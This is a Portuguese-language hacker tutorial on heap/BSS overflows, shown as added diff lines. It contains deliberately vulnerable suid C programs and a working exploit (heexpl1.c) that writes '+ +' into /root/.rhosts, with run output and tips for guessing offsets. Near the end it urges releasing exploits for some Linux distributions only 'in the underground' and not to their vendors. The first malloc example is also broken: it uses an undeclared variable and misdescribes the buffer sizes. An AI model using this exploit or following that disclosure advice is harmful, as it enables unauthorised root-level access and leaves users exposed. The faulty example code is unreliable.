+mesmo soh possuo o conhecimento de dois, o Stack Guard p/ estacoes
+sun/solaris, e um recem criado, conhecido como Stack Shield, sendo este
+ultimo para plataformas linux.Devem existir bem mais por aih, e se de
+alguma forma isto se concretizar, logo logo estarao acoplados as
+distribuicoes de sistemas operacionais.Mas, como vimos no inicio,
+existem outras regioes de memoria, e dentre estas, uma possui uma
+particularidade interessante, eh a regiao BSS. Podemos visualizada
+virtualmente no desenho do item 1.3 deste arquivo texto.Ateh o presente
+momento, nao foi divulgada ainda uma possivel protecao a essa regiao
+da memoria contra os buffers overflows,nesse caso conhecido como
+heap overflows ou heap baseado em bss overflows.
+Heap overflows, ao contrario dos Stack overflows, nao sao muito
+conhecidos, sao pouquissimos os textos que ensinam algo sobre isso, mas
+nao desanime amigo, porque entendo bem os overflows em Stack e um pouco
+mais de C, voce poderah perfeitamente entender e consequentemente
+praticar isto aqui tambem.Entao amigo, quando voce se deparar com um
+sistema que possui protecao contra "Stack Overflows", nao pense duas
+vezes, tente "heap Overflows", porque, como vimos no desenho do cap 1.3,
+heap pode ser usado p/ exploitar o stack e a bss, e ateh mesmo passar
+por cima de uma dessas protecoes de Stack aih, lembrando que, o autor
+desse txt nao faz parte do time de seguranca, vai ver a situacao ainda
+eh pior do que a descrita aqui, por mim!!:)
+
+
+6.1 - Alocacao Dinamica em C
+-----------------------------
+
+Irei aqui dar uma breve explicacao de como eh feita a alocacao dinamica
+de dados em C.Lembrando que nao eh intuito deste tutorial ensinar C ou
+qualquer outra linguagem, fique atento a atual home page do grupo
+Unsekurity Team, sempre tem algo relacionado a programacao por lah.
+A alocacao dinamica em C tem diversas utilidades, uma delas eh a criacao
+de listas de informacoes de comprimento veriavel, muito utilizadas em
+aplicacoes de banco de dados, eis aih um dos motivos de se preferir um
+BD feito a mao, do que lixos como oracle,mysql e etc..Mas isso fica para
+outra oportunidade, no momento, tenhamos em mente que para manipularmos
+dados na regiao BSS, onde usaremos nossos Heap Overflows, necessitamos
+saber este conceito de Alocacao Dinamica.Isso pode servir para um futuro
+breve, mano!!
+O sistema de alocacao dinamica do C, contem muitas funcoes, mas as mais
+importantes e mais usadas sao malloc() e free(), tambem se usa muito
+calloc().A alocacao dinanica permite ao programador  alocar
+memoria para variaveis quando o programa estah sendo executado.
+Isso poderah ser muito util em aplicacoes IPC visando escrita em
+buffers que nao recebem dados pela linha de comando.Mas aguarde!!
+Um simples exemplo de alocacao dinamica segue abaixo:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define   A     0x41
+
+main (void) {
+
+static char  *buffer, string[300];
+int tamanho,i;
+
+tam = 200;
+if((buffer=(char *)malloc(tam)) == NULL){
+      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
+      exit(1);
+ }
+
+for (i=0; i<tam ; i++)
+buffer[i] = A;
+
+strcpy(string,buffer);
+printf("Eis aih a string mano: %s !!\n",string);
+return 0;
+}
+
+
+Esse eh um exemplo simples.O que malloc() fez acima foi tornar *buffer
+um vetor de "tam" posicoes, e alocou um buffer do tamanho de
+"tam".De cara voce pode perceber algumas coisas, a variavel tam
+no caso acima, possui tamanho igual a 200, enquanto malloc aloca um
+espaco de 300 bytes para buffer, eh evidente que sobra espaco em buffer,
+mas se ao inves de 200 em tamanho, colocarmos, por exemplo, 330.Veja
+voce mesmo o resultado obtido, nossa boa e velha resposta:
+
+Segmentation fault
+
+O que voce acaba de fazer amigo, eh o que chamamos de Heap Overflow.
+Olhe um fonte para isso aih abaixo:
+
+----------------------------heapbug1.c-------------------------------
+/* Exemplo de programa bugado a Heap Overflow */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define   A     0x41
+
+main (int argc, char *argv[]) {
+
+static char  *buffer, *string;
+int tamanho,i;
+
+if(argc < 2){
+printf("Primeiro Programa bugado para Heap Overflow!\n");
+printf("Uso: %s <tamanho_buffer>\n",argv[0]);
+exit(0);
+}
+
+tamanho = atoi(argv[1]);
+if((buffer=(char *)malloc(tamanho)) == NULL){
+      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
+      exit(1);
+ }
+if((string=(char *)malloc(tamanho - 50)) == NULL){
+      fprintf (stderr,"Erro: Nao pode alocar memoria!!\n");
+      exit(1);
+ }
+for (i=0; i<tamanho ; i++)
+buffer[i] = A;
+
+strcpy(string,buffer);
+printf("Eis aih a string mano: %s !!\n",string);
+return 0;
+}
+---------------------------------------------------------------------
+
+Voce pode notar acima que ambos os ponteiros(*strings e *buffer) sao
+alocados dinamicamente na memoria, e um(buffer) sobrescreve o
+outro(string). O exemplo acima eh soh demontrativo, nao vah escrever
+exploit para ele nao mano!!:).Mais abaixo voce verah um programa bugado
+que podemos tirar proveito.
+
+
+-------------------
+7 - HEAP OVERFLOWS |
+-------------------
+
+Heap Overflows sao bastante semelhantes a Stack overflows, onde:
+
+* Ambos exploram a vulnerabilidade de funcoes que nao checam
+  o tamanho dos dados injetados sobre um buffer, ou simplesmente,
+  permitem que se coloque mais dados num buffer do que ele
+  permite aceitar;
+
+* Ambos podem explorar a area da memoria conhecida como Stack, mas
+  somente os Heap Overflows podem sobrescrever buffer na regiao
+  conhecida como BSS.
+
+* Ambas podem ser usadas para inserir codigos maliciosos na intuicao
+  de conseguir acesso a dados, sistemas, execucao de programas e etc;
+
+* Ambas podem ser usadas remotamente;
+
+* Dependendo do nivel de programacao do fucador, pode-se exploitar
+  qualquer funcao que nao checa o tamanho dos dados inseridos num
+  buffer para execucao de codigo malicioso como o dono do programa;
+
+Como podemos ver, a teoria aplicada ao Stack Overflow, eh bastante
+compativel, mas voce deve me perguntar, entao onde estah a diferenca??
+Diferente do primeiro caso(Stack Overflows), os dados em Heap Overflows
+nao serao empurrados no Stack(podem ateh ser, mas aqui nao abordarei
+dessa forma), e sim na regiao conhecida como BSS, atraves de funcoes
+que nos permitem alocar memoria dinamicamente.Nos nossos exemplos
+tambem exploitaremos programas bugados que guardam seus dados na BSS,
+e nao no Stack.Aih estah uma diferenca consideravel, porque mesmo que
+o sistema alvo nao possuia protecao no Stack, de que adianta voce
+tentar exploitar um programa(funcao), se ele nao armazena lah suas
+informacoes? De qualquer modo, o conhecimento de heap overflows, creio
+eu, se faz necessario para tempo futuro, como descrevi acima, talvez
+em breve nao seja mais possivel Stack Overflows, aih mano, voce terah
+que saber disso daquih mais cedo ou mais tarde.
+Tomei conhecimento quando escrevia este texto que apareceu mais
+um patch para kerneis contra buffer overflows, algo que tenta limitar
+execucao de programas com uid 0, uma especie de getuid() melhorado,
+fiquem atentos a isso, agora mais do que nunca a uniao e pesquisa,
+bem como a divulgacao de resultados obtidos, se faz necessario,
+visando um maior conhecimento de todos frente a estes patchs.Nao tenho
+confirmacao disso ainda, mas tou colocando jah aqui, pois com certeza
+um dia isso vai aparecer, ao contrario do que dizem, temos bons
+profissionais de seguranca, muita gente jah se vendeu, mas de qualquer
+forma, eles continuam sendo bons.Mas continuando.
+
+Bem, um conhecimento maior de C, vai ser necessario agora.Vamos comecar
+usando Heap Overflows para sobrescrever ponteiros.Heap Overflows que
+sobrescrevem ponteiros sao considerados o mais primitivo metodo de escrita
+de heap overflows, pois pode-se usar este metodo para sobrescrever um
+arquivo, como por exemplo o arquivo passwd.Abaixo segue um exemplo
+basico de como se manipular ponteiros, descrito por Matt Conover, do
+grupo w00w00, em seu tutorial sobre Heap Overflows, vale mais do que
+uma olhada, veja em "www.w00w00.org" o tutorial completo.Prosseguindo:
+
+ /* Demonstracao de static pointer overflow em bss (uninitialized data)
+    Desenvolvido por Matt Conover, descrito em seu tutorial sobre
+    Heap Overflows.
+    Alterado por Nash Leon para uso neste Tutorial.
+*/
+
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <unistd.h>
+   #include <string.h>
+   #include <errno.h>
+
+/* Define tamanho do buffer que serah usado para sobrescrever */
+
+   #define BUFSIZE 16
+/* Define tamanho de bytes em um endereco */
+   #define ADDRLEN 4
+
+   int main()
+   {
+    u_long diff;
+      static char buf[BUFSIZE], *bufptr;
+
+      bufptr = buf, diff = (u_long)&bufptr - (u_long)buf;
+
+      printf("bufptr (%p) = %p, buf = %p, diferenca = 0x%x (%d) bytes\n",
+      &bufptr, bufptr, buf, diff, diff);
+
+      memset(buf, 'A', (u_int)(diff + ADDRLEN));
+
+      printf("bufptr (%p) = %p, buf = %p, diferenca = 0x%x (%d) bytes\n",
+             &bufptr, bufptr, buf, diff, diff);
+
+      return 0;
+   }
+
+Compile-o normalmente e depois execute-o, voce irah receber algo parecido
+com as linhas abaixo:
+
+bufptr (0x80496b8) = 0x80496a8, buf = 0x80496a8, diferenca = 0x10 (16) bytes
+bufptr (0x80496b8) = 0x41414141, buf = 0x80496a8, diferenca = 0x10 (16) bytes
+
+O que podemos perceber acima eh que o ponteiro no fim aponta para um
+endereco diferente de memoria que apontava no inicio.O que se pode fazer
+com isso, eh aproveitar uma vulnerabilidade  onde nos possamos
+sobrescrever algum arquivo temporario para apontar para uma string
+separada(como por exemplo um parametro em argv[1] que nos mesmos possamos
+prover), que possa conter algo malicioso, como "/root/.rhosts".
+
+Para demontrar isto, iremos dar uma olhada em um programa bugado com
+estas caracteristicas,iremos usar um arquivo temporario para momentanea-
+mente salvar dados colocados(input) de algum usuario.O programa abaixo
+tambem foi escrito por Matt Conover, e tambem pode ser obtido em
+www.w00w00.org, bem como seu tutorial sobre Heap Overflows que estou
+me baseando.
+
+----------------------------heapvul1.c--------------------------------
+
+   /*
+    * Este eh um tipico programa vulneravel.Ele irah armazenar dados
+    * de entrada(input) em um arquivo temporario.
+    * Desenvolvido por Matt Conover.
+    * Alterado por Nash Leon.
+    * Compile com: gcc -o vulprog1 vulprog1.c
+    */
+
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <unistd.h>
+   #include <string.h>
+
+  #define BUFSIZE 16
+
+   /*
+    * Rode este vulprog como root para que tenha permissao para escrever
+    * o /root/.rhosts , ou entao adapte-o para o usuario que se encontra.
+    */
+
+   int main(int argc, char **argv)
+   {
+      FILE *tmpfd;
+      static char buf[BUFSIZE], *tmpfile;
+
+      if (argc <= 1)
+      {
+         printf("Uso: %s <lixo>\n", argv[0]);
+         exit(0);
+      }
+
+      tmpfile = "/tmp/vulprog.tmp"; /* Este nao eh o arquivo temporario
+                                        vulneravel. */
+      printf("antes: tmpfile = %s\n", tmpfile);
+      printf("Digite uma linha de dados para colocar em %s: ", tmpfile);
+      gets(buf);
+      printf("\napos: tmpfile = %s\n", tmpfile);
+
+      tmpfd = fopen(tmpfile, "w");
+      if (tmpfd == NULL)
+      {
+         fprintf(stderr, "Erro abrindo %s: %s\n",tmpfile,strerror(errno));
+         exit(1);
+      }
+
+      fputs(buf, tmpfd);
+      fclose(tmpfd);
+   }
+
+------------------------------------------------------------------------
+
+Compila esse programa bugado e depois seta ela como suid.
+(Como root digite: chmod +s heapvul1)
+
+Abaixo segue um exploit para este programa bugado, tambem feito por
+Matt Conover, para variar.
+
+-----------------------------heexpl1.c---------------------------------
+
+  /*
+   * Copyright (C) January 1999, Matt Conover & WSD
+   *
+   * Alterado por Nash Leon.
+   *
+   * Este exploit vai passar alguns argumentos para o programa(que o
+   * programa vulneravel nao usa), exploitando o mesmo.O programa
+   * vulneravel espera que nos digitemos uma linha de dados de entrada,
+   * para ser armazenada temporariamente.Todavia, por causa de um
+   * static buffer overflow, nos podemos sobrescrever o arquivo
+   * temporario apontado, para que ele aponte para argv[1](que nos
+   * devemos passar como "/root/.rhosts").Entao ele irah escrever nossa
+   * linha temporaria para este arquivo.Entao nos sobrescrevemos a string,
+   * (que nos iremos passar como nossa linha de entrada de dados) para que
+   * seja:
+   * + + # tamanho de (endereco tmpfile) - (endereco de buf) # de A's |
+   *       endereco de argv[1]
+   *
+   *
+   * Nos usamos "+ +", permite todos os hosts, seguido por '#' , que eh
+   * usado para comentarios em shell scripts, para previnir que nosso
+   * "codigo de ataque" cause problemas.Sem a "#", programas usando
+   * .rhosts devem interpretar mal nosso codigo de ataque.
+   *
+   * Compile com: gcc -o exploit1 exploit1.c
+   */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define BUFSIZE 256
+
+#define DIFF 16 /* Diferenca estimada entre buf/tmpfile em heapvul1 */
+
+#define VULPROG "./heapvul1"
+#define VULFILE "/root/.rhosts" /* o arquivo 'buf' que serah armazenado */
+
+/* Pega o valor de Stack Pointer(sp) fora do Stack.(Usado para
+   calcular o endereco de argv[1] */
+
+   u_long getesp()
+   {
+      __asm__("movl %esp,%eax"); /* equiv. de 'return esp;' em C */
+   }
+
+int main(int argc, char **argv)
+   {
+      u_long addr;
+
+      register int i;
+      int mainbufsize;
+
+      char *mainbuf, buf[DIFF+6+1] = "+ +\t# ";
+
+      /* ------------------------------------------------------ */
+      if (argc <= 1)
+      {
+         fprintf(stderr, "Uso: %s <offset> [tente 310-330]\n", argv[0]);
+         exit(1);
+      }
+      /* ------------------------------------------------------ */
+
+memset(buf, 0, sizeof(buf)), strcpy(buf, "+ +\t# ");
+
+memset(buf + strlen(buf), 'A', DIFF);
+addr = getesp() + atoi(argv[1]);
+
+/* reverse byte order (em um sistema little endian) */
+
+for (i = 0; i < sizeof(u_long); i++)
+buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);
+
+mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULPROG) +
+strlen(VULFILE) + 13;
+
+mainbuf = (char *)malloc(mainbufsize);
+memset(mainbuf, 0, sizeof(mainbuf));
+
+snprintf(mainbuf, mainbufsize - 1, "echo '%s' | %s %s\n",
+               buf, VULPROG, VULFILE);
+
+printf("Sobrescrevendo tmpaddr p/ apontar p/ %p, check %s depois.\n\n",
+             addr, VULFILE);
+
+   system(mainbuf);
+      return 0;
+}
+
+
+---------------------------------------------------------------------
+
+Compila ele e executa.Olha, ele mandou tentar offsets de 310 a 330, mas
+eu soh consegui chutando 379, voce pode ir chutando, e vendo o que
+aparece em "apos: tmpfile =".Veja meu exemplo abaixo:
+
+[localhost:/]$ ./heexpl1 350
+Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb56, check /root/.rhosts
+depois.
+
+antes: tmpfile = /tmp/vulprog.tmp
+Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
+apos: tmpfile =
+erro abrindo : No such file or directory
+
+[localhost:/]$ ./heexpl1
+Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb74, check /root/.rhosts
+depois.
+
+antes: tmpfile = /tmp/vulprog.tmp
+Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
+apos: tmpfile = root/.rhosts
+erro abrindo root/.rhosts: No such file or directory
+
+Preste atencao acima, o "apos: tmpfile = root/.rhosts" indica que
+o ponteiro estah bem proximo de alcancar o endereco que queriamos.
+
+[localhost:/]$ ./heexpl1 379
+Sobrescrevendo tmpaddr p/ apontar p/ 0xbffffb73, check /root/.rhosts
+depois.
+
+antes: tmpfile = /tmp/vulprog.tmp
+Digite uma linha de dados para colocar em /tmp/vulprog.tmp:
+apos: tmpfile = /root/.rhosts
+
+
+Pronto!!O arquivo foi escrito com sucesso!!Chute offsets de 5 em 5,
+prestando sempre atencao no que apareco na linha
+"apos: tmpfile = /root/.rhosts", veja que no ultimo exemplo ele
+nao apresentou mensagem de erro.Se voce me pergunta se isso pode ser
+melhorado??? Pode sim, lembre-se que ele diz acima que usa 1 metodo
+para pegar o 'return address', voce conhece varios metodos, incremente
+um seu, e verah melhoras consideraveis neste exploit.
+
+A funcao vulneravel do programa "heapvul1" descrito, eh a funcao gets(),
+como muitas, ela tambem nao faz checagem no tamanho de buffer que
+recebe.
+Talvez voce esteja achando tudo isso muito dificil, nao vou me
+aprofundar, isso foi soh para que voce tenha uma ideia, no proximo,
+talvez explique mais detalhado isso tudo,de uma olhada nesse txt do
+Matt Conover, ele eh um dos poucos disponiveis.
+
+
+--------------------
+8 - O PROJETO OMEGA |
+--------------------
+
+Irei descrever de forma breve, o que se trata este "Projeto", nao
+entrarei em detalhes tecnicos por enquanto, pois foge do intuito deste
+tutorial, haja visto, nao considero simples as demonstracoes praticas
+desta tecnica.O que se pretende com isto, eh a eliminacao da necessidade
+de se chutar offsets, isso que fazemos muito.Existem tecnicas de forca bruta,
+que faz com que programas facam isso por nos, a gente deixa lah e ele
+fica rodando o exploit, chutando offsets ateh que consiga nosso objetivo,
+mas esse projeto omega eh diferente, tem em mente acabar com a necessidade
+de chutar offsets.No inicio, como sempre, muita gente nao deu ideia ao
+cara que veio com essa teoria, ele eh conhecido como "lamagra", mas
+parece que agora o pessoal anda vendo que ele tem razao.Recentemente
+foi publicado num zine de grande circulacao, o HWA zine, que pode ser
+obtido em www.csoft.net/~hwa , uma materia contendo material feito por
+esse lamagra para o zine "core zine", que pode ser baixado na propria
+home page do lamagra, em http://bounce.to/unah16/.
+Eu nao sei precisar mais dados sobre isso, mas creio que existe
+um porem, como tem aparecido patchs e programas no intuito de evitar
+buffer overflows, creio que o proprio conceito de buffer overflows
+como tecnica de ataque estah em jogo.Sabemos que nao existe somente
+estah tecnica, mas creio que o conhecimento desta eh essencial.O
+esforco do lamagra eh valido, e creio que devemos sim medir esforcos
+para termos dominio sobre essa teoria e consequentemente pratica-la.
+Caso seja possivel, num futuro txt sobre overflows, incluirei uma
+parte tecnica destinada a este projeto.Mas por enquanto, caso queira
+conferir, leia o zine "core zine", de numeros 02 e 03, e verah algo
+sobre essa teoria e muitas outras coisas interessantes, tem ateh um
+tutorial sobre stack overflows, na versao 01, se nao me engano.
+Sem mais sobre isso por enquanto.
+
+
+---------------------
+9 - PROCURANDO FUROS |
+---------------------
+
+Existem varios metodos para ver se um programa eh bugado ou nao.
+Irei enumerar apenas alguns.
+Sabemos que um programa para ser vulneravel a um buffer overflow
+necessita possuir um bug(uma falha), em seu codigo ou implementacao,
+que permita que causemos um desvio do curso normal do programa atraves
+do enchimento de um buffer usado por uma funcao que nao faz checagem de
+tamanho dos parametros que recebe.Sao varias as funcoes em C que podem
+ser vulneraveis a buffer overflows, mas dependendo da implementacao,
+uma funcao considerada "bugada" pode muito bem fazer uma checagem do
+tamanho dos dados que recebe e nao ser mais considerada bugada.Um
+exemplo disso segue abaixo:
+
+scanf("%s ", variavel);
+
+scanf("%500s ", variavel);
+
+
+Se variavel foi declarada para receber ateh 512 bytes, no primeiro caso,
+se digitarmos mais de 512, conseguiremos um buffer overflow, mas no
+segundo caso nao, pois existe uma checagem dos parametros recebidos por
+scanf().
+
+Muitas funcoes possuem funcoes substitutas, que sao funcoes que efetuam
+a mesma operacao da funcao considerada "bugada"( por nao fazer a
+checagem do tamanho dos parametros que recebe) mas que checam o tamanho.
+
+Vemos um exemplo disso nas funcoes abaixo:
+
+strcat(variavel, buffer);
+
+strncat(variavel, buffer,sizeof(buffer));
+
+Se "variavel" possui um tamanho maior do que o de "buffer", no
+primeiro caso teremos sim uma possivel condicao de buffer overflow,caso
+coloquemos mais dados do que buffer possa suportar; mas no segundo caso,
+strncat faz uma checagem do tamanho de buffer antes de concatenar com
+variavel.
+
+
+O melhor metodo para saber se um programa eh vulneravel ou nao eh atraves
+da leitura de seu codigo-fonte.Eu disse no inicio desse txt que poderiamos
+saber se um programa eh vulneravel a overflow atraves do recebimento da
+mensagem "Segmentation Fault", mas isso por sih soh nao basta, pois
+muitos programas possuem erros que geram o recebimento desta mensagem.
+Voce pode sim tentar sempre um brutal force(tentando encher um buffer
+com muitos dados), e ver se consegue obter essa resposta.Isso eh util
+em programas com codigos fechados,mas mesmo para programas deste tipo
+existe uma solucao "melhor".Existe por aih, um programa capaz de
+descompilar um programa.Isso mesmo, coisa rustica ainda, mas pode ser
+util,voce pode obter mais informacoes sobre isso e baixar uma versao
+deste programa em http://www.it.uq.edu.au/groups/csm/dcc.html.
+
+Algum tempo atras, pouco tempo, saiu um programa chamado its4.Esse
+programa seria um "grep" melhorado, pois ele checa um codigo fonte
+em busca de possiveis vulnerabilidades, apontando possiveis
+solucoes(troca da funcao,checagem de bounds,etc), bem como indicando
+o nivel de risco no uso de cada funcao, e ainda permite uma atualizacao
+dos dados(acrescentar ou retirar uma funcao considerada bugada).Este
+programa eh muito conhecido e pode ser obtido em
+http://www.rtscorp.com/its4 ou mesmo nos sites de seguranca por aih,
+como na packetstorm, http://packetstorm.securify.com//.
+Mas ele por sih soh nao eh tudo, pois tambem divulga informacoes
+erradas, creio que uma busca serene e incessante de conhecimento de C
+eh mais do que essencial.Breve o Unsekurity Team deverah estar
+publicando mais textos no intuito de massificar conhecimentos nesta
+area, bem como abranger mais sistemas operacionais.
+
+Irei enumerar algumas das funcoes que sao reconhecidas como sendo
+perigosas, pois podem ser vulneraveis a ataques de buffer overflows,
+nao irei diferenciar quanto a regiao de memoria, mas a maioria pode ser
+exploitada tanto via Heap como Stack overflows.Sao elas:
+
+strcpy();
+scanf();
+fscanf();
+strcat();
+gets();
+fgets();
+fprintf();
+sprintf();
+vsprintf();
+strstr();
+bzero();
+bcopy();
+getopt();
+getpass();
+getcwd;
+popen();
+system();
+execvp();
+avoid execlp();
+
+Tambem podem ocorrer overflows sob certas circunstancias em:
+
+strncpy();
+strncat();
+getenv();
+atexit();
+strdup();
+tmpnam();
+malloc();
+readdir();
+seekdir();
+printf();
+
+Dentre possivelmente outras.
+
+Como voce pode ver,nao sao poucas as funcoes, e dependendo sim do nivel
+do fucador, eh possivel gerar overflows em qualquer funcao descritas
+acima.Agora que voce jah tem conhecimento de como nao eh tao dificil
+gerar um overflow, mas o quanto eh dificil fazer um programa complexo
+seguro, creio que devemos sim respeitar os programadores bem como a
+comunidade de seguranca, nao eh facil fazer um programa com milhares de
+linhas de codigos sem possuir uma condicao para buffer overflow.
+De qualquer forma,tendo em vista um maior aprendizado nisso tudo,
+iremos de alguma forma forcar a escrita de codigos mais seguros e
+estaveis, tudo para que o usuario comum possa algum dia ter a seguranca
+de usar um programa ou navegar na internet e etc, sem a preocupacao de
+alguem estar bisbilhotando seus dados.Fucadores eticos respeitam os
+dados das pessoas e lutam contra as grandes corporacoes para garantir
+a privacidade dessas pessoas, mesmo que lah fora elas nao saibam as
+reais causas que nos levam a isso tudo, acredito que eh mais do que
+gratificante forcar esse pessoal(grandes corporacoes inescrupulosas)
+a fazer o que nao querem, que eh dar maior qualidade e seguranca
+ao uso pessoal dos computadores de um modo geral.
+
+
+Aproveito essa parte para dizer algo tambem.Eu estava pensando em
+publicar algum exploit de nossa autoria, mas aih um membro do grupo
+me alertou para algo que eu ainda nao havia pensado: "Nao devemos
+publicar nossos exploits", quando muito, devemos liberar apenas aos
+mais intimos e conhecidos que de fato nao publicarao, por que??
+
+* Primeiro  -> A comunidade de seguranca estah ficando cada vez mais
+               rica.Sao empresas e mais empresas trabalhando para as
+               corporacoes, e em nenhum momento eles gastam dinheiro
+               para divulgar a causa hacker(digo hacker,nao cracker!),
+               pois eles jah estao inseridos no sistema.
+
+* Segundo   -> Talvez voce tenha algum exploit proprio para sistemas
+               abertos, como linux que afete uma distribuicao descente.
+               Quando eu falo descente amigo, digo "Debian", pois ateh
+               mesmo o Slackware tah seguindo no rumo de capitalizar
+               dinheiro em cima do linux.Se voce descobrir um exploit
+               para um sistema como Debian, aconselho voce a divulgar
+               de inicio ao pessoal que faz a distribuicao, os desenvo-
+               vedores,programadores, procurando contato diretamente
+               com eles.Mas se for para as outras distribuicoes linux,
+               em especial Red Hat linux, Caldera Open Linux, Red Hat
+               Conectiva Linux, Corel Linux, e o que tah vindo agora,
+               Motorola Linux, divulgue seu exploit somente no
+               underground, deixe que eles depois tratem de achar o
+               bug e consertar, pois essas distribuicoes nao possuem
+               escrupulos e estao denegrindo e se aproveitando do
+               trabalho alheio.Abram os olhos, quem nao garante que
+               amanha a Red Hat nao seja uma nova microsoft???
+
+* Terceiro ->  A comunidade de seguranca na sua maioria(alguns ainda
+               escapam) nao se importam com voce, querem que voce vah
+               preso, e nao fazem questao de diferenciar o termo
+               hacker do termo cracker, simplesmente porque eles
+               ganham quando a midia divulga os criminosos que trazem
+               prejuizos para todos.Por isso, amigo, se teu ego falar
+               alto porque voce conseguiu descobrir algo novo, cuidado
+               voce vai ajudar esses caras, mas eles nao irao ajudar
+               voce, caso um dia precise.
+
+* Quarto ->    Um cara que divulga um exploit para um determinado bug,
+               que se diz de um grupo fucador ou nao, deve ter em mente
+               o perigo que representa a divulgacao do exploit, me refiro
+               ao uso desse exploit por parte dos kiddies e lamers.Uma
+               coisa eh voce dizer que tal programa possui um bug em
+               determinada funcao, outra eh voce disponibilizar um
+               exploit para isso.A realidade, eh que o pessoal que irah
+               fazer um exploit para o bug descoberto por voce, eh bem
+               reduzido, no entanto, caso divulgue um exploit, o
+               universo do pessoal que o usarah seja lah para quais
+               intuitos for, serah demasiadamente grande.Nos ataques de
+               DDoS recentes, um dos "fabricantes" de uma das possiveis
+               ferramentas usadas foi severamente acusado de participar
+               diretamente dos ataques, que garantia voce terah que nao
+               farao isso contigo??
+
+
+Bom, esses sao soh alguns itens que me levam a fazer apologia da
+"Nao Divulgacao de Exploits" por parte de fucadores.Sei que a comunidade
+de seguranca nao gosta deste tipo de ideologia,mas lembrando, nao eh
+para eles que escrevo.Nao deixe seu ego tomar conta de voce mano!!Faca
+as coisas com conciencia!!
+
+----------------
+10 - TERMINANDO |
+----------------
+
+10.1 Links e Referencias
+--------------------------
+
+"Smashing The Stack For Fun And Profit" por Aleph One.
+Pode ser obtido em: http://www.phrack.com -> Zine 49, item 14.
+                    http://packetstorm.securify.com/ -> Manda achar.
+                    http://www.technotronic.com/
+                    http://www.2600.com/phrack/
+                    http://www.securityfocus.com/
+
+"w00w00 on Heap Overflows"  por Matt Conover.
+Pode ser obtido em: http://www.w00w00.org/
+                    http://www.securityfocus.com/
+
+"adv.overflow.paper" por Taeho Oh.
+Pode ser obtido em: http://www.technotronic.com/
+                    http://www.securityfocus.com/
+
+"STACK OVERFLOW EXPLOiTS ON LiNUX/BSDOS/FREEBSD/SUNOS/SOLARiS/HP-UX" -
+ Feito pelo pessoal da The Hacker's Choice.
+Pode ser obtido em: www.infowar.co.uk/thc/ -> Procure por thc-mag3.zip.
+
+
+"Writing buffer overflow exploits - a tutorial for beginners" por Mixter.
+Pode ser encontrado em:
+http://members.tripod.com/mixtersecurity/papers.html
+http://1337.tsx.org/
+
+"How to write Buffer Overflows" - por Mudge.
+Pode ser obtido em :
+http://www.l0pht.com/
+http://www.insecure.org/stf/mudge_buffer_overflow_tutorial.html
+
+"Buffer Overruns, whats the real story?" - por Lefty.
+Pode ser obtido em: http://packetstorm.securify.com/
+                    http://www.securityfocus.com/
+
+"Attack Class: Buffer Overflows" - por Evan Thomas.
+Pode ser obtido em: http://helloworld.ca/
+
+** Existem bons materiais em portugues, que merecem sim uma olhada.
+   Nao sei aonde se acha, mas sei dos zines da Axur e da RWX.
+   Procure em algum sistema de busca.
+
+Axur0503.new - Item 6 - "The Stack" - por csh.
+
+rwx01.txt - Item 2 - "OVERFLOWS" - por auth.
+
+** E tambem um bom material recente:
+
+mbcbuffer.txt - "INSIDE TO BUFFERS OVERFLOWS" - por  cync.
+Pode ser obtido em: http://www.mbc-corp.com.br
+
+Nao conheco outros txts em portugues, mas vale a gratidao a todos
+aqueles que tem contribuido para democratizar informacoes nao soh no
+nosso pais como em todos os cantos da Terra.
+                
+
+Alguns links:
+
+http://bounce.to/unah16/  -> Info sobre o Projeto Omega.
+
+http://www.posthuman.za.net -> Zine f0rbidden knowledge, procure a
+                               edicao 08, tem algo sobre overflows.
+
+
+"Crispin Cowan, et al., StackGuard: Automatic Adaptive Detection and
+ Prevention of Buffer-Overflow Attacks" - Sobre o Stack Guard.
+http://www.cse.ogi.edu/DISC/projects/immunix/StackGuard/usenixsc98_html/
+
+.........................................................................
+
+10.2 Consideracoes Finais.
+--------------------------
+
+Aih estah amigo, por enquanto isso eh tudo.Em breve estarei
+disponibilizando mais materiais de nivel, visando maior abrangencia de
+conhecimentos por parte de todos aqueles que se encontrarem dispostos
+a aprender.Tem muitas coisas sobre buffer overflows ainda, creio que
+em breve estarei disponibilizando mais tutoriais sobre programacao de
+sockets e shellcodes acoplando junto sempre exemplos de buffer overflows.
+Em breve estarah sendo disponibilizado algo tambem referente a programacao
+IPC, bem como alguma coisa sobre TCP/IP. Com a chegada destes materiais,
+vai ficar mais facil a compreensao de futuros tutoriais de sockets,
+investindo em UDP e RAW sockets, bem como com a chegada dos tutoriais de
+IPC, em exploitacao remota e de funcoes mais complexas.Eh soh questao de
+tempo, paciencia amigo!!
+
+Gostaria de agradecer aqueles que de uma forma ou de outra, tem colaborado
+com a distribuicao das informacoes aqui contidas, bem como ao pessoal
+que tem dado apoio.Espero que tudo isso sirva para alguem, bem como que
+isso possa ser passado para mais e mais pessoas, visando nao praticar
+coisas ruins, creio que ainda ha espaco para a etica, e a beleza da etica,
+ainda pode mudar pessoas, por isso, amigo, faca sua parte, nao deixe a
+chama apagar, mas nao queime nunca alguem com ela.
+
+Termino aqui direcionando meus agradecimentos a Ramona, meu grande amigo
+zip, module, psych, e-brain, raynox, t[rex], xf86config, cs0, Cdma,
+Matt_Salermo, Dani_Linidinha, CeZiNHa, f00, ocorvo, thunderoffire,
+Blind_Bard, d3m3ns, Dinamite_, e Magic Kiss.:)
+
+                                         Nash Leon vulgo coracaodelao
+                                         nashleon@yahoo.com.br
+
+----------------------------------EOF-----------------------------------
+
